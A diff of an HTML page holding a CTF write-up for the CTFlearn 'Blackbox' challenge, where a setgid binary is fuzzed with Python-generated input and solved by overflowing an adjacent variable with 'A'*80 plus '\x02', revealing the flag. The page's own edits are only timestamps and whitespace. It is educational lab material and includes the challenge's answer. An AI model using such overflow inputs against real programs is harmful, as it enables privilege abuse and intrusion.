@@ -14,13 +14,13 @@ blackbox@ubuntu-512mb-nyc3-01:~$ ls -l total 16 ---x--s--x 1 root blackbox_pwn 8
 blackbox@ubuntu-512mb-nyc3-01:~$ ls -l total 16 ---x--s--x 1 root blackbox_pwn 8936 Jan 31 2019 blackbox -r--r----- 1 root blackbox_pwn 33 Oct 9 2017 flag.txt blackbox@ubuntu-512mb-nyc3-01:~$ file blackbox blackbox: setgid executable, regular file, no read permission  As it can be seen, we have no read permission, so we cannot transfer the file to our machine, or decompile it, or debug it.">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7rocky.github.io/en/ctf/ctflearn/binary/blackbox/"><meta property="article:section" content="ctf">
-<meta property="article:modified_time" content="2022-01-21T03:30:52+01:00"><meta property="og:site_name" content="7Rocky">
+<meta property="article:modified_time" content="2022-01-21T10:14:49+01:00"><meta property="og:site_name" content="7Rocky">
 <meta property="og:image" content="https://7rocky.github.io/images/pwn.png">
 <meta property="og:author" content="7Rocky">
 <meta itemprop=name content="Blackbox">
 <meta itemprop=description content="We are given a server to connect using SSH. There is a binary called blackbox that is SGID:
 blackbox@ubuntu-512mb-nyc3-01:~$ ls -l total 16 ---x--s--x 1 root blackbox_pwn 8936 Jan 31 2019 blackbox -r--r----- 1 root blackbox_pwn 33 Oct 9 2017 flag.txt blackbox@ubuntu-512mb-nyc3-01:~$ file blackbox blackbox: setgid executable, regular file, no read permission  As it can be seen, we have no read permission, so we cannot transfer the file to our machine, or decompile it, or debug it.">
-<meta itemprop=dateModified content="2022-01-21T03:30:52+01:00">
+<meta itemprop=dateModified content="2022-01-21T10:14:49+01:00">
 <meta itemprop=wordCount content="558">
 <meta itemprop=keywords content>
 <meta name=twitter:card content="summary">
@@ -122,27 +122,27 @@ $
 total 16
 ---x--s--x 1 root blackbox_pwn 8936 Jan 31  2019 <span class="code-black code-bg-yellow">blackbox</span>
 -r--r----- 1 root blackbox_pwn   33 Oct  9  2017 flag.txt
-<span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ file blackbox 
-blackbox: setgid executable, regular file, no read permission
+<span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ file blackbox
+blackbox: setgid executable, regular file, no read permission  
 </code></pre></div>
 <p>As it can be seen, we have no read permission, so we cannot transfer the file to our machine, or decompile it, or debug it. The only thing we can do is run it:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ ./blackbox 
-What is 1 + 1 = 
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ ./blackbox  
+What is 1 + 1 =
 </code></pre></div>
 <p>We have only that user input. If we answer the question, we get:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ ./blackbox 
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ ./blackbox  
 What is 1 + 1 = 2
 No dummy... 1 + 1 != 0...
 </code></pre></div>
 <p>If we fuzz this input using Python, we get a <code>*** stack smashing detected ***</code> message:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ python3 -c 'print("A" * 100)' | ./blackbox
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ python3 -c 'print("A" * 100)' | ./blackbox  
 What is 1 + 1 = No dummy... 1 + 1 != 1094795585...
 *** stack smashing detected ***: &lt;unknown&gt; terminated
 
 [1]+  Stopped                 python3 -c 'print("A" * 100)' | ./blackbox
 </code></pre></div>
 <p>So the binary has a stack canary that protects from buffer overflows. We can decrease the amount of characters until we find this behaviour:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ python3 -c 'print("A" * 80)' | ./blackbox
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ python3 -c 'print("A" * 80)' | ./blackbox  
 What is 1 + 1 = No dummy... 1 + 1 != 0...
 <span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ python3 -c 'print("A" * 81)' | ./blackbox
 What is 1 + 1 = No dummy... 1 + 1 != 65...
@@ -173,19 +173,19 @@ What is 1 + 1 = No dummy... 1 + 1 != 1094795585...
 '0x4141'
 &gt;&gt;&gt; hex(4276545)
 '0x414141'
-&gt;&gt;&gt; hex(1094795585)
+&gt;&gt;&gt; hex(1094795585)  
 '0x41414141'
 </code></pre></div>
 <p>It seems clear that the result we need to enter <code>"\x02"</code> where there is a single <code>"A"</code> (<code>0x41</code>). That is, we need to enter 80 characters and the next character must be <code>"\x02"</code>, so that the question has a correct answer:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ python3 -c 'print("A" * 80 + "\x02")' | ./blackbox
-What is 1 + 1 = CORRECT! You get flag: 
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ python3 -c 'print("A" * 80 + "\x02")' | ./blackbox  
+What is 1 + 1 = CORRECT! You get flag:
 flag{0n3_4lus_1_1s_Tw0_dumm13!!}
 
 [3]+  Stopped                 python3 -c 'print("A" * 80 + "\x02")' | ./blackbox
 </code></pre></div>
 <p>Or even shorter:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ python3 -c 'print("\x02" * 81)' | ./blackbox
-What is 1 + 1 = CORRECT! You get flag: 
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>blackbox@ubuntu-512mb-nyc3-01</span>:<span class=code-blue>~</span>$ python3 -c 'print("\x02" * 81)' | ./blackbox  
+What is 1 + 1 = CORRECT! You get flag:
 flag{0n3_4lus_1_1s_Tw0_dumm13!!}
 
 [3]+  Stopped                 python3 -c 'print("\x02" * 81)' | ./blackbox
